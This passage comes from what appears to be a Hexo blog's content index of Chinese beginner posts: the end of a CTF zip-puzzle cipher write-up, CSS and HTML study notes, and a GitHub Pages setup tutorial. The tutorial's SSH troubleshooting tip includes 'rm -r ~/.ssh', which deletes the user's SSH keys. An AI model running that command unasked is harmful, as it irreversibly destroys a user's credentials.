23 22 21 20 19 18 17 16 15 14 13 12 11 10 9 8 7 6 5 4 3 2 1&quot;); printf(&quot;\\n\\n&quot;); } return 0; } 输入第一个密钥，运行结果如下 然后想到明文3前四个字母应该就是f、l、a、g，而密文3前四个字母是x、l、o、o。所以第二个密钥应该是f(x)=(l-l)%26+97=a; 第三个密钥应该是f(x)=(a-o)%26+97=m;第四个密钥应该是f(x)=(g-o)%26+97=s; 然后明文1第五个字母应该是t，密文1第五个字母是m。第五个密钥应该是f(x)=(t-m)%26+97=g+1=h; 注意： 明文-密文=正值，从前往后数，密钥=正值(即英文字母序号)+1； 明文-密文=负值，从后往前数，密钥=负值的绝对值(即26-英文字母序号)； 找到密钥序号对应的字母 明文-密文=零，密钥=a； 不断找寻密钥、明文、密文间的规则，最后得出全部密钥和最终flag 下面也有个别人写好得python脚本，果然写python脚本才更简洁、更容易。我要努力学python了！！ 以上便是我做CTF压缩包类型题的总结，总结许多收获也许多。小白进阶ing!!!","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/tags/CTF/"},{"name":"MISC","slug":"MISC","permalink":"https://qwzf.github.io/tags/MISC/"},{"name":"ZIP","slug":"ZIP","permalink":"https://qwzf.github.io/tags/ZIP/"}],"author":"qwzf"},{"title":"Web前端-CSS篇","slug":"Web前端-CSS篇","date":"2019-03-30T11:39:32.075Z","updated":"2020-08-01T16:07:07.314Z","comments":true,"path":"2019/03/30/Web前端-CSS篇/","link":"","permalink":"https://qwzf.github.io/2019/03/30/Web前端-CSS篇/","excerpt":"","text":"学习CSS之后，感觉对Web前端又有了更深一步的理解。学习总结了许久，总算把学习笔记写完了，顿觉一阵轻松！！学习过程中，虽然有些枯燥，但最终的收获却很多很多。下面便是我的CSS的学习笔记，自我认为还行~~ 一、CSS定义和三种用法1、CSS:层叠样式表负责页面内容的样式 标签的属性产生的问题： 浏览器麻烦，需要改很多 对开发人员：复杂，难维护 解决方法： 通过标签选择器，样式属性选择标签 可复用 html放标签 css放样式 2、CSS三种用法：第一种用法：内联样式 第二种用法：内部样式 第三种用法：外部样式 二、CSS语法1、选择器与内容/* div:选择器 {}内容：声明 */ /*注释*/ div { color: yellow; width: 200px; height: 200; background: green; } 2、颜色1.rgb色彩模式 R 红色 浅深 0255 G 绿色 b 蓝色 用法一： div { color: rgb(240,0,0); } 用法二： div { color: rgb(100%,20%,0%); } 2.名称 red yellow blue red… div { color: rgb(100%,20%,0%); } 3.十六进制 09 AB R 红色 浅深 0255 225写成ff (ff即15*15) #ff0000可以简写成#f00 G 绿色 b 蓝色 div { color: #ff0000; color: #f00; } 三、CSS选择器大括号{}前的，如：div{} 选择器是div 作用：通过选择器找到对应的html的元素，并把选择器的样式传给元素 选择器的分类： 基本选择器、组合选择器、属性选择器、伪元素选择器 1、基本选择器1、通配符选择器 *{ border: 1px solid blue /*给所有元素加个外边框*/ } 2、标签div选择器 div{ border: 1px solid blue /*给div标签加个外边框*/ } 3、id选择器 html中：&lt;div id=&quot;txt&quot;&gt;ppp&lt;/div&gt; #txt{ /*#txt，*省略/ font-size: 50px; /*font-size字体大小*/ } id具有唯一性 4、class类型选择器 html中：&lt;div class=&quot;txt txt1&quot;&gt;ppp&lt;/div&gt; .txt{ font-size: 50px; } .txt1{ /* div.txt1{color: #ff0000;} 作用于div标签下的class=&quot;txt1&quot; color: #ff0000; } class不具有唯一性 比较常用 2、组合选择器把基本选择器 通过特殊符号串在一起 分组选择器 &lt;div&gt;div1&lt;/div&gt; &lt;p&gt;p1&lt;/p&gt; div,p{ background: green; color: red; } p{ /*相当于background: green; color: red;*/ font-size: 60px; } 嵌套选择器 空格隔开,嵌套在div里面的p才能生效 div p{ background: green; color: red; font-size: 60px; } 子选择器 1.父标签必须是div才能生效 div&gt;p{ background: green; color: red; font-size: 60px; } 2.相邻的 同级别的选择器 &lt;p&gt;&lt;/p&gt; div+p{ background: green; color: red; font-size: 60px; } 3、属性选择器基本s[属性] &lt;p title=&quot;txt&quot;&gt;p1&lt;/p&gt; p[title=txt]{ /*p标签有title属性且值相同的才能生效*/ background: green; color: red; font-size: 60px } p[title~=txt]{ /*p标签有title属性且值有txt的(且其它字符在html里与txt以空格隔开)才能生效*/ background: green; color: red; font-size: 60px } p[title^=txt]{ /*p标签有title属性且值以txt开始的才能生效*/ background: green; color: red; font-size: 60px } &lt;p title=&quot;txt yy&quot;&gt;p1&lt;/p&gt; p[title$=yy]{ /*p标签有title属性且值以yy结束的才能生效*/ background: green; color: red; font-size: 60px } 4、伪元素选择器伪元素：自动加的、看不到的元素 如：开始before 结束after &lt;p title=&quot;txt&quot;&gt; &lt;!--&lt;before&gt;--&gt; p1 &lt;!--&lt;after&gt;--&gt; &lt;/p&gt; p::before{ content:&quot;before&quot;; /*content修改内容*/ font-size: 20px; } p::after{ content:&quot;after&quot;; /*content修改内容*/ font-size: 120px; } p { background: green; color: red; font-size: 60px } 块元素 第一个字母：first-letter 第一行：first-line 伪类 选择器 根据状态来改变 四、CSS原理原则 优先原则：后解析的覆盖先解析的内容 继承原则：嵌套里面标签拥有外部标签某些样式 子元素可以继承父元素的属性 ​ 1.与文字有关的文本、样式可以被继承 ​ 2.块级元素，宽度不被设置的 继承父元素的宽 高由内容决定 优先原则：同一个选择器，从上往下执行 ​ 同一类型选择器，从上往下执行 ​ 不同类型的选择器，先解析低优先级的，再解析高优先级的 *&lt;div&lt;class&lt;id 外部样式和内部样式: 外部样式和内部样式合并之后 一起解析 ​ 先外部样式后内部样式 内联样式: 外部和内部样式解析完后，才解析内联样式 加了important字段的最后执行: div{ background-color: red!important; /*可以测试用*/ } 五、背景body { background-color: red；/*颜色*/ background-image: url(&#39;图片地址&#39;)/*图片复制平铺完整个页面*/ background-repeat: repeat-x;/*沿着x轴平铺/ background-repeat: no-repeat;/*不平铺，就一张图片*/ background-position: 100px 100px;/*50% 0%;*//*x轴 y轴*//*图片移动*/ /*x:left center(50%) right y:top(0%) center(50%) bottom*/ background-attachment: fixed/*固定背景*/ /*可简写成background: color image repeat attachment;*/ background: red url(&#39;图片地址&#39;) repeat-x fixed; } 六、文本/*字符间距*/ letter-spacing: 0px; /*空格的距离*/ word-spacing:0px; direction: ltr; /*left to right文本从左到右排列*/ text-decoration: none;/*默认*/ text-decoration: line-through;/*一条线中间穿过*/ text-decoration: overline;/*一条线上方穿过*/ text-decoration: underline;/*一条线下方穿过*/ /*对齐方式*/ text-align: center(居中) left(左) right(右) justify(两端) 可以加个宽高和颜色等width:200px;height:200px; /*缩进*/ text-indent: 50px; /*英文字母大小写*/ text-transform: uppercase lowercase capitalize(首字母大写) /*取消换行*/ white-space: nowrap; /*隐藏部分文本内容*/ overflow: hidden; /*加省略号*/ text-overflow: ellipsis; /*图片和文字的搭配*/ img{ weight:200px; /*垂直对齐 top center bottom*/ vertical-align: top;/*文字排在顶端*/ float:left;/*文字围绕图片排列*/ } 七、链接和列表1、链接 a{ color: green; } 伪类 a:link{ /*初始状态*/ color: blue; } a:visited{ /*被访问*/ color: green; } a:hover{ /*鼠标移动*/ color: yellow; font-size: 80px; } a:active{ /*点击*/ color: red; } 2、列表ul{ list-style-type: disc;/*实心圆*/ } ul前面样式 none: 不使用项目符号 disc: 实心圆 circle: 空心圆 square: 实心方块 ol前面样式 demical: 阿拉伯数字 lower-alpha: 小写英文字母 upper-alpha: 大写英文字母 lower-roman: 小写罗马数字 upper-roman: 大写罗马数字 列表加图片logo样式 li{ background-image: url(&#39;图片路径&#39;); background-repeat: no-repeat;/*消去平铺*/ height: 50px; padding: 25px 50px 0;/*盒子模型调整图片位置*/ } 八、盒子模型所有的元素可以看成矩形的盒子 内容 内边距 盒子框 外边距 &lt;div class=&quot;box1&quot;&gt;div1&lt;/div&gt; &lt;div class=&quot;box2&quot;&gt;div2&lt;/div&gt; .box1{/*盒子框*/ border: 5px solid blue; /*内边距 上下 左右*/ padding: 10px 10px; /*上 左右 下*/ padding: 10px 20px 10px; /*上 右 下 左*/ padding: 10px 20px 10px 20px; 可写成： padding-top: padding-bottom: padding-left: padding-right: /* background-color: green;*/ /*外边距*/ margin: 20px;/*和内边距相似*/ } .box2{ border: 5px solid black; } 九、布局标准流：从上往下排列 浮动：float float: left right; clear: both;/*调整后，在下个div容器清除浮动，回到标准流状态*/ /*伪元素*/清浮动 .container::after{ content: &quot;&quot;; display: block; clear: both; } /*伪元素 清理浮动和margin*/ .container::before{ content: &quot;&quot;; display: table; } .container::after{ clear: both; } 十、定位div{ width: 200px; height: 300px; background: blue; /*定位 固定定位*/ position: fixed; bottom: 100px; right: 50px; } .div1{/*相对定位*/ position: relative; top: 50px; left: 100px; } /*绝对定位 不跟父元素(如:.container)一起移动*/ .div1{ position: absolute; top: 50px; left: 100px; } 上面便是我对Web前端CSS部分的学习，学习总会有收获，No pain No gain! 小白进阶ing 一起努力进阶吧！！！！","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://qwzf.github.io/categories/编程开发/"},{"name":"前端","slug":"编程开发/前端","permalink":"https://qwzf.github.io/categories/编程开发/前端/"}],"tags":[{"name":"Web前端","slug":"Web前端","permalink":"https://qwzf.github.io/tags/Web前端/"},{"name":"CSS","slug":"CSS","permalink":"https://qwzf.github.io/tags/CSS/"}],"author":"qwzf"},{"title":"Web前端-HTML篇","slug":"Web前端-HTML篇","date":"2019-03-25T14:54:31.921Z","updated":"2020-08-01T16:06:51.799Z","comments":true,"path":"2019/03/25/Web前端-HTML篇/","link":"","permalink":"https://qwzf.github.io/2019/03/25/Web前端-HTML篇/","excerpt":"","text":"最近学习了Web前端的入门课程，深有感触，于是写了这篇学习笔记总结了一下，希望能加深自己的理解，而在此之前，为了写一个表单提交页面，学习了一些html的基础知识。在这些基础上学习Web前端，感觉学习轻松多了有么有？感觉真好！ 一、前端介绍 前端包括：html、css、javascript 入门阶段：改一般页面和动效 前端历史：第一个网站→table表格→JavaScript→Flash→CSS→栅栏与框架→响应式→ H5(HTML5) 二、Web编程-环境搭建1、网页浏览器： 谷歌、火狐、IE、苹果Safari F12打开控制台 2、代码编译器 vscode、sublime、atom、webstorm、dreamwarver 设置Tab、插件 3、git代码管理1.代码仓库统一保存、管理代码的地方 如：github 2.git及简单操作 cd C: 进入到c盘 cd Users/Test 进入到当前盘的Users/Test文件夹 git init 创建代码仓库 git init 在一个文件目录执行该指令，会把该目录快速设置成git的代码仓库。 git clone 仓库地址 克隆仓库到本地 git config --global user,name &quot;XX&quot; 配置身份信息 git config --global user.email &quot;xx@qq.com&quot; 配置身份信息 git add xx.xml 后面可以加单独的文件 git add app app是一个文件夹 git add . 全部文件 add这个只是添加，我们还需要提交 git commit -m &quot;First commit&quot; 双引号之中是相关的描述,提交(提交到本地缓存的仓库)更新文件 git push 提交到远程仓库 三、网页基本概念与基本结构1、基本概念 网页是构成网站的基本元素，是承载各种网站应用的平台 是html文档经过浏览器渲染以后展示出来的页面 html文档：后缀为.html 渲染：代码经过浏览器处理，产生人正常能看懂的页面 编码：通过代码形式，把要展示的页面写到html文档 1.html+css页面内容html：负责页面结构文本内容：能被浏览器直接显示出来的文字和符号 标签：不能被浏览器直接显示出来的、具有特殊意义的，用尖括号括起来的字符 主要标签包括：文本、图片、链接、列表、表格、表单、框架(嵌套页面) 语法： html从上往下解析 元素可以互相嵌套 html的结构 css负责页面样式2.javascript页面行为2、基本结构&lt;!DOCTYPE html&gt; &lt;html lang=&quot;zh&quot;&gt; &lt;!-- lang属性声明主要语言，属性值zh：中文，属性值en：英文 --&gt; &lt;head&gt; &lt;!-- 主要配置信息,设置 --&gt; &lt;title&gt;标题&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;/&gt; &lt;!-- 属性值还有gbk和gb2312 --&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- body标签可以写css属性 --&gt; &lt;h1&gt;我的第一个标题&lt;/h1&gt; &lt;p&gt;我的第一个段落&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; 四、前端基础HTML1、文本1.水平线单纯水平线：&lt;hr /&gt; 类型：单标签 2.主题内容中的标题 &lt;h1&gt;&lt;/h1&gt; &lt;!-- 一级标题 --&gt; &lt;h2&gt;&lt;/h2&gt; &lt;!-- 二级标题 --&gt; &lt;h3&gt;&lt;/h3&gt; &lt;!-- 三级标题 --&gt; &lt;h4&gt;&lt;/h4&gt; &lt;!-- 四级标题 --&gt; &lt;h5&gt;&lt;/h5&gt; &lt;!-- 五级标题 --&gt; &lt;h6&gt;&lt;/h6&gt; &lt;!-- 六级标题 --&gt; 类型：双标签 3.段落&lt;p&gt;&lt;/p&gt;类型：双标签 4.换行&lt;br /&gt; 类型：单标签 5.空格（1）&amp;nbsp 不是标签，可以当做特殊字符。 （2）输入法用全角 2、图片 &lt;img src=&quot;&quot; alt=&quot;&quot; width=&quot;&quot; height=&quot;&quot; /&gt; 属性src里填图片路径图片路径分为：绝对路径和相对路径&lt;!--相对路径：相对于当前html文件路径--&gt; ./当前目录../上一级目录在当前目录建一个文件夹：images 将所展示图片都放在里面 属性alt里填图片说明属性width里填图片长度：也可以用百分比表示属性height里填图片高度：也可以用百分比表示类型：内联元素实例 &lt;img src=&quot;1.jpg&quot; alt=&quot;哈士奇&quot; width=&quot;100&quot; height=&quot;100&quot;/&gt; 3、链接 &lt;a href=&quot;http://www.baidu.com/&quot; title=&quot;鼠标悬停显示&quot; target=&quot;_blank&quot;&gt;百度一下&lt;/a&gt; 属性href：需要连接的网址，网站建设初期用#链接表示空链接 属性title：鼠标悬停显示 属性target：设置_blank，在新窗口打开链接地址 类型：内联元素 4、图片映射（1）为map标签加上id属性，定义一个唯一属性（2）为保证兼容性加name属性，属性值与id值相同（3）为map标签所作用图片img标签加usemap属性，属性名为#id名称（4）在map标签内嵌套area标签实现给指定区域加链接 &lt;area shape=&quot;&quot; coords=&quot;&quot; href=&quot;&quot; alt=&quot;&quot; /&gt; 属性shape：定义链接区域形状，常用值rect（矩形）circle（圆形） poly(多边形)属性coords：确定区域精确位置，填坐标&lt;!--以左上角为原点--&gt;属性href：链接地址属性alt：链接说明 5、列表1.有序列表 &lt;ol&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;/ol&gt; 子元素，父元素，后代元素，兄弟元素 2.无序列表&lt;!-- 列表需要嵌套写法 --&gt; &lt;ul&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;/ul&gt; 3.定义列表 &lt;dl&gt; &lt;dt&gt;&lt;/dt&gt; &lt;dd&gt; &lt;/dd&gt; &lt;/dl&gt; 6、表格实例 &lt;table border=&quot;1&quot; cellpadding=&quot;2&quot; cellspacing=&quot;1&quot;&gt; &lt;tr&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;学号&lt;/th&gt; &lt;th&gt;年龄&lt;/th&gt; &lt;th&gt;成绩&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;小王&lt;/td&gt; &lt;td&gt;133&lt;/td&gt; &lt;td&gt;19&lt;/td&gt; &lt;td&gt;100&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; table标签属性：border 作用：规定表格边框宽度属性：cellpadding 作用：规定文字和边框的间距属性：cellspacing 作用：规定每个单元格边框宽度tr标签：html表格中的行th标签：表格内表头单元格td标签：表格内普通单元格常用属性：colspan：规定单元格可横跨列数，值为数字rowspan：规定单元格可横跨行数，值为数字 7、表单1.标签&lt;form&gt;：定义供用户输入的html表单属性：action：规定提交表单向何处发送表单数据name：表单命名target：_blank在新窗口打开method：提交方式，get或post值类型：双标签 2.&lt;input&gt;标签:定义表单输入页面&lt;!-- 通过type属性展示不同输入页面，通过value改变默认值 --&gt; （1）普通文本框： &lt;input type=&quot;text&quot; /&gt; （2）密码框： &lt;input type=&quot;password&quot; /&gt; （3）文件上传： &lt;input type=&quot;file&quot; /&gt; （4）隐藏的input： &lt;input type=&quot;hidden&quot; /&gt; （5）普通按钮： &lt;input type=&quot;button&quot; /&gt; （6）单选：&lt;input type=&quot;radio&quot; /&gt; &lt;!--通过相同name属性实现单选--&gt; 实例 &lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;男&lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;女 （7）复选框： &lt;input type=&quot;checkbox&quot; /&gt; ` （8）提交： &lt;input type=&quot;submit&quot; /&gt; （9）重置： &lt;input type=&quot;reset&quot; /&gt; 属性placeholder 可用值text：规定帮助用户填写输入字段提示属性checked 可用值checked：用于选择页面（单复选），实现默认选择属性disabled 可用值disabled：使标签不可用属性name：给input输入界面起名字属性readonly 可用值readonly ：使输入界面为只读状态属性size 值为数字：设置输入框长度属性value：该属性值为input提交到页面的数据，可通过该属性设置默认值 3.textarea标签：定义多行输入框 &lt;!--双标签，默认值写标签之间--&gt; 属性cols 值为数字属性rows 值为数字也可使用disabled name readonly属性实例 自我介绍：&lt;textarea cols=&quot;20&quot; rows=&quot;10&quot;&gt;&lt;/textarea&gt; 4.label标签：提升用户体验标签for属性与input的id属性相同 5.select标签：配合option实现下拉菜单可用属性：disabled name multiple &lt;select&gt; &lt;option&gt;&lt;/option&gt; &lt;/select&gt; 6.option标签可用属性：disabled select value 7.optgroup标签 &lt;!--把相关选项组合在一起--&gt; 属性label：给选项组命名属性disabled：停用该选项组实例 &lt;select&gt; &lt;optgroup label=&quot;河南省&quot;&gt; &lt;option value=&quot;周口&quot;&gt;周口&lt;/option&gt; &lt;option&gt;郑州&lt;/option&gt; &lt;option&gt;洛阳&lt;/option&gt; &lt;/optgroup&gt; &lt;/select&gt; 表单提交实例 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;title&gt;html表单提交&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;账户登录&lt;/h1&gt; &lt;form name=&quot;submit&quot; action=&quot;http://www.baidu.com/&quot; target=&quot;_blank&quot; method=&quot;get&quot;&gt; &lt;!-- 由于表单提交需要进行数据处理，html语言无法实现，暂且写成向百度提交数据 --&gt; 账号：&lt;input name=&quot;text&quot; type=&quot;text&quot; size=&quot;20&quot; /&gt; &lt;br /&gt; 密码：&lt;input name=&quot;password&quot; type=&quot;password&quot; size=&quot;20&quot; /&gt; &lt;br /&gt; &lt;input type=&quot;submit&quot; value=&quot;确认登录&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 8、布局将小块排列好 1.div容器布局&lt;div style=&quot;background:blue; height:80px;&quot;&gt;菜单&lt;/div&gt; &lt;div style=&quot;background:yellow; width:50%;&quot;&gt;导航&lt;/div&gt; &lt;div style=&quot;background:red; width:50%;&quot;&gt;关于&lt;/div&gt; 2.table布局3.iframe布局作用：嵌套页面 百度一下：&lt;iframe src=&quot;http://www.baidu.com&quot; frameborder=&quot;0&quot;&gt;&lt;/iframe&gt; 4.frameset布局作用：管理后台页面 &lt;frameset rows=&quot;12%,88%&quot;&gt; &lt;frame src=&quot;frame1.html&quot;&gt; &lt;frameset cols=&quot;20%,80%&quot;&gt; &lt;frame src=&quot;frame2.html&quot;&gt; &lt;frame src=&quot;frame2.html&quot;&gt; &lt;/frameset&gt; &lt;/frameset&gt; 9、嵌套规则块元素：独立成一行，可以设置宽高，默认宽高100% 文字类块元素：&lt;p&gt; &lt;h1&gt;~&lt;h6&gt; 容器类块元素：div table tr td th from ul li ol dl dt dd 行元素：不独立成一行，不可以 内容决定 a img input strong em del span 特殊字符：文字 br &amp;nbsp; 嵌套规则 1.块元素可以嵌套行元素&lt;div&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/div&gt; 2.行元素可以嵌套行元素&lt;a href=&quot;&quot;&gt;&lt;strong&gt; a&lt;/strong&gt;&lt;/a&gt; 3.行元素不可以嵌套块元素&lt;a href=&quot;&quot;&gt; &lt;div&gt;&lt;/div&gt; &lt;/a&gt; &lt;!--错误--&gt; 4.文字类块元素不可以嵌套块元素&lt;p&gt;这是一&lt;p&gt;&lt;/p&gt;句话&lt;/p&gt; &lt;!--错误--&gt; 5.容器类块元素可以嵌套块元素&lt;div&gt;&lt;p&gt;&lt;/p&gt;&lt;/div&gt; 以上便是我学习Web前端HTML部分的学习和练习记录，在总结练习过程中，我收益颇多。小白进阶ing，下一篇我将会把我学习Web前端CSS部分记录一下希望能再次丰富我对Web前端的理解和运用。","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://qwzf.github.io/categories/编程开发/"},{"name":"前端","slug":"编程开发/前端","permalink":"https://qwzf.github.io/categories/编程开发/前端/"}],"tags":[{"name":"Web前端","slug":"Web前端","permalink":"https://qwzf.github.io/tags/Web前端/"},{"name":"HTML","slug":"HTML","permalink":"https://qwzf.github.io/tags/HTML/"}],"author":"qwzf"},{"title":"Github-Hexo简单搭建","slug":"Github-Hexo的搭建","date":"2019-03-17T04:36:45.934Z","updated":"2020-08-01T16:03:21.492Z","comments":true,"path":"2019/03/17/Github-Hexo的搭建/","link":"","permalink":"https://qwzf.github.io/2019/03/17/Github-Hexo的搭建/","excerpt":"","text":"这几天由于团队下发了一个任务，需要搭建一个github-hexo个人博客。第一次听到这个任务，你是不是有点懵，反正当时的我是特别懵。由于从没有搭建过一些东西，想着是不是特别有趣？于是在浓厚好奇心的驱使下，我开启了自学模式，学习一些大佬的搭建经验和讲解。总算在不懈努力的学习下，幸运的成功无踩坑搭建了我的github-hexo个人Blog。由此，我写下这篇blog，希望能帮助大家无踩坑快速搭建自己的个人blog。 一、准备搭建环境：1.node.js的安装在浏览器上搜索node.js，进入官网。出现两个下载板块，LTS长期支持版，Current为当前最新版。我下载的是LTS版本的，此时是v10.15.3。nodejs里面的npm工具非常有用，可以在方便的安装一些插件。下载地址打开cmd命令行，成功页面如下 C:\\Users\\ASUS&gt;D: //注意你安装的路径，我所有的文件都安装在D盘上了，也可以安装在其他路径 D:\\&gt;node -v v10.15.3 D:\\&gt;npm -v 6.4.1 2.Git的安装在浏览器上搜索git for windows，进入官网，点击Dawnload进行下载。但一般下载有点问题，需要翻墙下载。是不是有点担心，别着急，你也可以点击右边这个网址下载地址下载，各种版本的都有哦！安装步骤：一直next到下面这个页面选择第二个，然后一路next。打开cmd命令行，成功页面如下 C:\\Users\\ASUS&gt;D: D:\\&gt;git version git version 2.21.0.windows.1 二、Hexo的安装前面配置搭建环境，看起来是不是特简单。如果此时你认为搭建很简单的话，那你就想错了，从此时开始需要注意了，困难正一步一步向你袭来。创建文件夹，安装hexo先创建一个用来存放所有博客的东西的文件夹，并重命名，我为了容易记，创建了一个名为blog的文件夹。进入该文件夹目录，鼠标右击，选择Git Bash Here进入命令行。开始安装Hexo，安装命令：npm install hexo-cli -g安装结束后，成功命令如下 C:\\Users\\ASUS&gt;D: D:\\&gt;cd blog D:\\blog&gt;hexo -v hexo-cli: 1.1.0 os: Windows_NT 10.0.17134 win32 x64 http_parser: 2.8.0 node: 10.15.3 v8: 6.8.275.32-node.51 uv: 1.23.2 zlib: 1.2.11 ares: 1.15.0 modules: 64 nghttp2: 1.34.0 napi: 3 openssl: 1.1.0j icu: 62.1 unicode: 11.0 cldr: 33.1 tz: 2018e 然后初始化初始化命令：hexo init blog初始化后打开，会出现下面这些文件： node_modules：是依赖包 public：存放的是生成的页面 scaffolds：命令生成文章等的模板 source：用命令创建的各种文章 themes：主题 _config.yml：整个博客的配置信息 db.json：source解析所得到的 package.json：项目所需模块项目的配置信息我可能操作有点问题，在blog目录下还有个qwzf文件夹，上述文件都在qwzf文件夹里，我记得我当时初始化的时候，执行的命令是hexo init qwzf 结果如下 三、Github的创建和配置1.Github的创建（1）注册账号GitHub是一个面向开源及私有软件项目的托管平台，在第一次使用github，需要进行注册。 注册地址 （2）初始设置提交注册信息后，会弹出一个界面，这里我们选择免费用户就可以了。默认的FREE后面Chosen按钮已经是选中状态了。 （3）验证账号新建一个储存仓库名称为yourname.github.io, 其中yourname是你的github名称，按照这个规则创建才有用，我的是 qwzf.github.io发现邮箱地址未验证登录注册时的邮箱，进行验证 2.新建仓库在主页右上角，点击加号，找到New repository，点进去会显示如下界面，输入仓库名，点击创建 3.Github的配置（1）配置github账户信息回到cmd中，配置github账户信息（YourName和YourEail都替换成你自己的） D:\\blog\\qwzf&gt;git config --global user.email &quot;YourEail&quot; //配置用户邮箱，和注册github的邮箱一致 D:\\blog\\qwzf&gt;git config --global user.name &quot;YourName&quot; //配置用户名，和注册github的用户名一致 （2）生成SSH密钥打开Git Bash Here命令行，输入ssh-keygen -t rsa -C &quot;你的邮箱&quot;然后一直回车到结束，这样就成功在C盘用户个人目录生成了.ssh文件夹打开.ssh文件夹，会出现两个文件，选择下方的那个文件，用记事本打开。会出现以下内容，全选复制登录你的gihub账号，点击Your profile然后点击Edit profile进入，选择SSH并新建一个SSH Key其中Title中的名称可以任意填写，将C:\\Users\\Administrator.ssh目录下id_rsa.pub复制的所有内容粘贴到Key中，点击Add SSH Key，SSH密钥完成可以在gitbash中验证是否添加成功：ssh -T git@github.com问题：假如ssh-key配置失败，那么只要以下步骤就能完全解决 首先，清除所有的key-pairssh-add -Drm -r ~/.ssh删除你在github中的public-key 重新生成ssh密钥对ssh-keygen -t rsa -C “xxx@xxx.com“ 接下来正常操作在github上添加公钥public-key:1、首先在你的终端运行 xclip -sel c ~/.ssh/id_rsa.pub将公钥内容复制到剪切板2、在github上添加公钥时，直接复制即可3、保存 测试：在终端 ssh -T git@github.com 四、_config.yml文件的配置看到上面的过程，是不是感到一些厌烦，别着急哦，到这一步，就离成功搭建，只剩一步之遥了。用编辑器（我用的sublime Text）打开你的blog项目，修改_config.yml文件的一些配置: url: https://qwzf.github.io deploy: type: git repo: https://github.com/qwzf/qwzf.github.io.git branch: master 将qwzf换成你自己的用户名 五、本地预览和上传到Github（1）本地预览回到gitbash中，进入你的blog目录，分别执行以下命令： hexo clean hexo generate hexo server 命令也可以简写成 hexo clean hexo g hexo s 声明：hexo 3.0把服务器独立成单个模块，需要单独安装：npm i hexo-server打开浏览器输入：http://localhost:4000 就可以在本地看到Hexo了是不是有点兴奋，完成下面最后一步，就可以部署到github上喽！ （2）上传到Github先安装：npm install hexo-deployer-git –save（这样能将你写的文章部署到github服务器上并让别人浏览到）执行命令(建议每次都按照如下步骤部署)： hexo clean //清理缓存 hexo generate //本地生成 hexo deploy //提交到服务器 命令也可以简写成 hexo clean hexo g hexo d 注：deploy的过程中要输入你的username及passward然后在浏览器中输入http://yourgithubname.github.io就可以看到你的个人博客啦。感觉gitbash中东西太多的时候输入clear命令清空命令简写hexo n “我的博客” == hexo new “我的博客” #新建文章hexo g == hexo generate #生成hexo s == hexo server #启动服务预览hexo d == hexo deploy #部署 hexo server #Hexo会监视文件变动并自动更新，无须重启服务器hexo server -s #静态模式hexo server -p 5000 #更改端口hexo server -i 192.168.1.1 #自定义 IPhexo clean #清除缓存，若是网页正常情况下可以忽略这条命令 六、修改及配置主题hexo初始化之后默认的主题是landscape , 然后你可以去这个 地址 里面找到你想要的主题，进行克隆。都有相关的介绍，next比较充分，但我觉得不太美观，就自己挑选了个精美主题进行配置修改，按着说明来就好了，反正一直改就完了！挑选结束后，可以将主题copy到themes目录，如 git clone https://github.com/HmyBmny/hexo-theme-concise.git themes/concise 修改_config.yml中的theme： theme: concise所有的主题模板，共有的操作方式就只有这两个，但是不同的模板，会有很多不同的设置，这里就需要针对模板的使用说明进行修改了。建议通过github找到模板，看下readme。我觉的这个大佬的主题修改和配置可能会有点帮助， 链接地址 这便是我搭建Github-Hexo的过程，希望能用这篇blog，让大家少入坑，成功搭建属于自己的个人博客。教程千万条，避坑第一条。搭建不规范，入坑更容易。","categories":[{"name":"博客","slug":"博客","permalink":"https://qwzf.github.io/categories/博客/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://qwzf.github.io/tags/Hexo/"},{"name":"Github","slug":"Github","permalink":"https://qwzf.github.io/tags/Github/"},{"name":"Hexo搭建","slug":"Hexo搭建","permalink":"https://qwzf.github.io/tags/Hexo搭建/"}],"author":"qwzf"},{"title":"超文本标记语言html","slug":"html基础篇一","date":"2019-03-15T15:43:10.703Z","updated":"2020-08-01T16:05:35.529Z","comments":true,"path":"2019/03/15/html基础篇一/","link":"","permalink":"https://qwzf.github.io/2019/03/15/html基础篇一/","excerpt":"","text":"超级文本标记语言是标准通用标记语言下的一个应用，也是一种规范，一种标准，它通过标记符号来标记要显示的网页中的各个部分。但需要注意的是，对于不同的浏览器，对同一标记符可能会有不完全相同的解释，因而可能会有不同的显示效果。下面是我学习html前半部分后作出的简单总结以及一些练习实例，鄙人才疏学浅，敬请大佬指正。 1、html基本格式 &lt;!DOCTYPE html&gt; &lt;!--声明文档解析类型--&gt; &lt;html&gt; &lt;!--根标签（开始）--&gt; ​ &lt;head&gt; &lt;!--头标签（开始）--&gt; ​ &lt;title&gt;html基本结构&lt;/title&gt; &lt;!-- 整个页面标题 --&gt; ​ &lt;/head&gt; &lt;!--头标签（结束）--&gt; &lt;body&gt; &lt;!--主体标签（开始）--&gt; ​ &lt;!--代码要缩进--&gt; ​ &lt;h1&gt;我的第一个标题&lt;/h1&gt; &lt;!--主题内容中的标题--&gt; ​ &lt;p&gt;我的第一个段落&lt;/p&gt; &lt;!--页面内容--&gt; &lt;/body&gt; &lt;!--主体标签（结束）--&gt; &lt;/html&gt; &lt;!--根标签（结束）--&gt; 2、html标签单标签：&lt;br /&gt;双标签：&lt;标签名&gt;&lt;/标签名&gt; 3、html属性定义：用来完成对受控文字的某些特殊效果或功能。html属性分为：属性名和属性值。 ==属性名=属性值== 中间使用=分隔 属性值写在引号（单引号或双引号）里面。 &lt;a 